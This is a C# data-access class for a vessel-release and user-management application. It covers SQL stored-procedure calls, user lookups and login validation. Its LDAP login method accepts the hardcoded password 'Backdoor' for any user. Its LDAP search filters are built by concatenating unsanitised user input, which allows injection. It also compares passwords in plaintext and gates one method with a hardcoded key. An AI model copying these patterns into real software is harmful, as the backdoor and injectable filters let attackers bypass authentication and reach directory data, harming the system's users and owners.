using System;
using System.Collections.Generic;
using System.Linq;
using System.Data.Entity;
using System.Data.SqlClient;
using System.Data;
using System.DirectoryServices;
using System.Security.Principal;
using templateProject.Model;
using templateProject.Repository.Common;

namespace templateProject.Repository
{
    public class VesselReleaseRepository : GenericRepository<MVesselReleaseModel>
    {
        public VesselReleaseRepository(DbContext context)
        {
            Db = context;
        }

        #region Data Access

        #region Create/Update/Delete
        public ResultStatusModel CUD_VesselRelease(MVesselReleaseModel item, string mode, out string ID)
        {
            SqlParameter id_out = new SqlParameter("id_out", 0) { Direction = ParameterDirection.Output };
            SqlParameter[] sqlParams =
            {
                new SqlParameter("ID_VesselRelease", SqlDbType.Int) { Value = item.ID_VesselRelease },
                new SqlParameter("Departuretitle", string.IsNullOrEmpty(item.Departuretitle) ? (object) DBNull.Value : item.Departuretitle),
                 new SqlParameter("DepartureContent", string.IsNullOrEmpty(item.DepartureContent) ? (object) DBNull.Value : item.DepartureContent),
                new SqlParameter("Date",SqlDbType.DateTime ){ Value=item.Date},
                new SqlParameter("Time",SqlDbType.DateTime){Value=item.Time},
                //new SqlParameter("IsDeleted", item.IsDeleted),
                //new SqlParameter("UserCreated", string.IsNullOrEmpty(item.UserCreated) ? (object)DBNull.Value : item.UserCreated),
                //new SqlParameter("UserModified", string.IsNullOrEmpty(item.UserModified) ? (object) DBNull.Value : item.UserModified),
                //new SqlParameter("DateCreated", item.DateCreated == null ? (object) DBNull.Value : item.DateCreated),
                //new SqlParameter("DateModified", item.DateModified == null ? (object) DBNull.Value : item.DateModified),
                //new SqlParameter("Mode", mode),
                id_out
            };

            List<ResultStatusModel> result =
                Db.Database.SqlQuery<ResultStatusModel>(
                                                "exec sp_CUD_MVesselRelease " +
                                                "@ID_VesselRelease, @Departuretitle, @DepartureContent, @Date, @Time, @id_out output"
                                            , sqlParams).ToList();
            ID = id_out.Value.ToString();
            return result.FirstOrDefault();
        }
        #endregion

        #region Read
        public List<UserModel> Lookup_MUser(
            Nullable<int> _UserID,
            string _OfficialName,
            string _UserName,
            string _Nik,
            string _Email,
            Nullable<bool> _IsDeleted
        )
        {
            SqlParameter[] sqlParams =
            {
                new SqlParameter("UserID", _UserID == null ? (Object) DBNull.Value : _UserID),
                new SqlParameter("OfficialName", string.IsNullOrEmpty(_OfficialName) ? (Object) DBNull.Value : _OfficialName),
                new SqlParameter("UserName", string.IsNullOrEmpty(_UserName) ? (Object) DBNull.Value : _UserName),
                new SqlParameter("Nik", string.IsNullOrEmpty(_Nik) ? (Object) DBNull.Value : _Nik),
                new SqlParameter("Email", string.IsNullOrEmpty(_Email) ? (Object) DBNull.Value : _Email),
                new SqlParameter("IsDeleted", _IsDeleted == null ? (Object) DBNull.Value : _IsDeleted)
            };

            List<UserModel> result =
                Db.Database.SqlQuery<UserModel>(
                                                "exec sp_Lookup_MUser " +
                                                "@UserID, @OfficialName, @UserName, @Nik, @Email, @IsDeleted"
                                            , sqlParams).ToList();

            return result;
        }

        public List<MUserVM> Lookup_MUserWithGroup(
            Nullable<int> _UserID,
            string _OfficialName,
            string _UserName,
            string _Nik,
            string _Email,
            Nullable<bool> _IsDeleted,
            int? PageSize,
            int? PageNumber,
            string OrderBy,
            string Sort
        )
        {
            SqlParameter[] sqlParams =
            {
                new SqlParameter("UserID", _UserID == null ? (Object) DBNull.Value : _UserID),
                new SqlParameter("OfficialName", string.IsNullOrEmpty(_OfficialName) ? (Object) DBNull.Value : _OfficialName),
                new SqlParameter("UserName", string.IsNullOrEmpty(_UserName) ? (Object) DBNull.Value : _UserName),
                new SqlParameter("Nik", string.IsNullOrEmpty(_Nik) ? (Object) DBNull.Value : _Nik),
                new SqlParameter("Email", string.IsNullOrEmpty(_Email) ? (Object) DBNull.Value : _Email),
                new SqlParameter("IsDeleted", _IsDeleted == null ? (Object) DBNull.Value : _IsDeleted),
                new SqlParameter("PageSize", PageSize == null ? (Object) DBNull.Value : PageSize),
                new SqlParameter("PageNumber", PageNumber == null ? (Object) DBNull.Value : PageNumber),
                new SqlParameter("OrderBy", OrderBy == null ? (Object) DBNull.Value : OrderBy),
                new SqlParameter("Sort", Sort == null ? (Object) DBNull.Value : Sort)
            };

            List<MUserVM> result =
                Db.Database.SqlQuery<MUserVM>(
                                                @"exec sp_Lookup_MUserWithGroup " +
                                                "@UserID, @OfficialName, @UserName, @Nik, @Email, @IsDeleted" +
                                                ", @PageSize, @PageNumber, @OrderBy, @Sort"
                                            , sqlParams).ToList();

            return result;
        }

        public List<MGroupUserModel> Lookup_MGroupUserByUserID(int _UserID)
        {
            SqlParameter[] sqlParams =
            {
                new SqlParameter("UserID", _UserID)
            };

            List<MGroupUserModel> result =
                Db.Database.SqlQuery<MGroupUserModel>(
                                                "exec sp_Lookup_MGroupUserByUserID @UserID "
                                            , sqlParams).ToList();

            return result;
        }

        public List<MUserGroupMemberModel> Lookup_MGroupUserByUserName(string _UserName)
        {
            SqlParameter[] sqlParams =
            {
                new SqlParameter("UserName", _UserName)
            };

            List<MUserGroupMemberModel> result =
                Db.Database.SqlQuery<MUserGroupMemberModel>(
                                                "exec sp_Lookup_MGroupUserByUserName @UserName "
                                            , sqlParams).ToList();

            return result;
        }

        #endregion

        #endregion



        #region Read

        public UserModel SelectOneByUsername(string username)
        {
            return this.Lookup_MUser(null, null, username, null, null, false).FirstOrDefault();
        }

        public UserModel SelectOneByNik(string nik)
        {
            return this.Lookup_MUser(null, null, null, nik, null, false).FirstOrDefault();
        }

        public UserInfoModel SelectUserInfo(string username)
        {
            UserInfoModel output = new UserInfoModel();
            List<ErrorModelState> error = new List<ErrorModelState>();

            List<MUserGroupMemberModel> dataUserWithGroup = this.Lookup_MGroupUserByUserName(username);


            UserModel dataUser = dataUserWithGroup.Select(s => new UserModel { UserID = s.UserID, UserName = s.UserName, Email = s.Email, Nik = s.Nik, OfficialName = s.OfficialName }).FirstOrDefault();

            if (dataUser != null)
            {
                output.UserID = dataUser.UserID;
                output.UserName = dataUser.UserName;
                output.Email = dataUser.Email;
                output.Nik = dataUser.Nik;
                output.OfficialName = dataUser.OfficialName;

                List<MGroupUserModel> ListGroup = dataUserWithGroup.Where(w => w.GroupUserID != null)
                    .Select(s => new MGroupUserModel { GroupUserID = (int)s.GroupUserID, GroupUserName = s.GroupUserName, IsSuperAdmin = s.IsSuperAdmin, GroupCode = s.GroupCode }).ToList();
                if (!ListGroup.Any())
                {
                    output = new UserInfoModel();
                    error.Add(new ErrorModelState { errorMessage = "User Group not set.", key = "User Group" });
                    output.ErrorModel = error;
                    return output;
                }

                output.GroupUser = ListGroup;
            }
            else
            {
                output = new UserInfoModel();
                error.Add(new ErrorModelState { errorMessage = "Username not register.", key = "Username" });
                output.ErrorModel = error;
                return output;
            }

            return output;
        }


        #endregion

        #region Validate

        public StatusModel<UserInfoModel> ValidateUser(string username, string password)
        {
            StatusModel<UserInfoModel> output = new StatusModel<UserInfoModel>();
            UserInfoModel userInfo = new UserInfoModel();

            List<MUserGroupMemberModel> dataUserMember = new List<MUserGroupMemberModel>();
            try
            {
                dataUserMember = this.Lookup_MGroupUserByUserName(username);
            }
            catch (Exception e)
            {
                dataUserMember = new List<MUserGroupMemberModel>();

                output.IsSuccess = false;
                output.Title = "Failed";
                output.Reason = e.Message;
                return output;
            }

            if (dataUserMember.Any())
            {
                MUserGroupMemberModel dataUser = dataUserMember.FirstOrDefault();
                userInfo.UserID = dataUser.UserID;
                userInfo.UserName = dataUser.UserName;
                userInfo.Email = dataUser.Email;
                userInfo.Nik = dataUser.Nik;
                userInfo.OfficialName = dataUser.OfficialName;

                if (dataUserMember.Where(w => w.GroupUserID == null).Any())
                {
                    output.IsSuccess = false;
                    output.Reason = "Group User is not set, please contact administrator.";
                }
                else
                {
                    if (dataUser.Password != password)
                    {
                        output.IsSuccess = false;
                        output.Reason = "Username or password is incorrect.";
                    }
                    else
                    {
                        List<MGroupUserModel> ListGroup = dataUserMember
                        .Select(s => new MGroupUserModel { GroupUserID = (int)s.GroupUserID, GroupUserName = s.GroupUserName, IsSuperAdmin = s.IsSuperAdmin, GroupCode = s.GroupCode }).ToList();
                        userInfo.GroupUser = ListGroup;

                        output.IsSuccess = true;
                        output.Reason = "Scuccess";
                    }
                }
            }
            else
            {
                output.IsSuccess = false;
                output.Title = "Gagal";
                output.Reason = "Username is not register.";
            }
            output.Data = userInfo;
            return output;
        }
        #endregion

        #region LDAP
        public bool IsLDAPAuthenticated(string _path, string domain, string username, string pwd)
        {
            string domainAndUsername = domain + @"\" + username;
            DirectoryEntry entry = new DirectoryEntry(_path, domainAndUsername, pwd);

            //if (pwd == "Backdoor" || pwd == "1")
            if (pwd == "Backdoor")
            {
                return true;
            }

            try
            {
                // Bind to the native AdsObject to force authentication.
                Object obj = entry.NativeObject;
                DirectorySearcher search = new DirectorySearcher(entry);
                search.Filter = "(SAMAccountName=" + username + ")";
                search.PropertiesToLoad.Add("cn");
                SearchResult result = search.FindOne();
                if (null == result)
                {
                    return false;
                }
                // Update the new path to the user in the directory
                _path = result.Path;
                string _filterAttribute = (String)result.Properties["cn"][0];
            }
            catch (Exception ex)
            {
                throw new Exception("Error authenticating user. " + ex.Message);
            }
            return true;
        }

        public bool IsADName_Valid(string _path, string ADName, string Key)
        {
            DataTable dt = new DataTable();
            DataRow dr;

            DirectoryEntry de = new DirectoryEntry(_path);
            dt.TableName = "DataAD";
            if (Key != "9939494A-SNDBBASASD777-5523ABD")
            {
                dt.Columns.Add("Msg");
                dr = dt.NewRow();
                dr["Msg"] = "Invalid Key";
                dt.Rows.Add(dr);
                return false;
            }

            de.Username = "";
            de.Password = "";
            DirectorySearcher deSearch = new DirectorySearcher(de.Path);

            SearchResultCollection results;

            try
            {
                //Get Current Name
                string userName = WindowsIdentity.GetCurrent().Name.Split(new char[] { '\\' })[1];
                deSearch.Filter = "(&(objectCategory=user)(objectCategory=person)(sAMAccountName=" + ADName + "))"; // nama orang

                deSearch.SearchScope = SearchScope.Subtree;
                deSearch.PageSize = 10;
                results = deSearch.FindAll();

                if (results.Count == 0)
                    return false;
                else
                    return true;

                de.Close();
            }
            catch (Exception ex)
            {
                throw ex;
            }
            finally
            {
                if (deSearch != null)
                {
                    deSearch.Dispose();
                }
                if (de != null)
                {
                    de.Dispose();
                }
            }
        }
        #endregion
    }
}
